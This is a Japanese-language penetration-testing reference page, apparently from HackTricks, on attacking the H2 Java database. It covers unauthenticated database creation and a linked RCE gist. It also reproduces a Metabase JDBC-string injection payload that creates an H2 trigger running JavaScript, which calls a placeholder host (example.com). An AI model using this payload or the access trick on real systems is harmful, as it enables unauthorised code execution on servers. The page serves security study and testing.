# H2 - Java SQLデータベース

{{#include ../../banners/hacktricks-training.md}}

公式ページ: [https://www.h2database.com/html/main.html](https://www.h2database.com/html/main.html)

## アクセス

**有効な資格情報なしで新しいデータベースを作成するために** **存在しないデータベース名を指定する**ことができます (**未認証**):

![](<../../images/image (131).png>)

また、例えば**mysqlが実行中であることを知っていて**、そのデータベースの**データベース名**と**資格情報**を知っている場合は、単にアクセスできます:

![](<../../images/image (201).png>)

_**HTBのボックスHawkからのトリック。**_

## **RCE**

H2データベースと通信するアクセスがある場合、これをチェックしてRCEを取得します: [https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed](https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed)

## H2 SQLインジェクションによるRCE

[**この投稿**](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/)では、**SQLインジェクション**を悪用して**H2データベース経由でRCEを取得する**ペイロードが説明されています。
```json
[...]
"details":
{
"db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER IAMPWNED BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nnew java.net.URL('https://example.com/pwn134').openConnection().getContentLength()\n$$--=x\\;",
"advanced-options": false,
"ssl": true
},
[...]
```
{{#include ../../banners/hacktricks-training.md}}
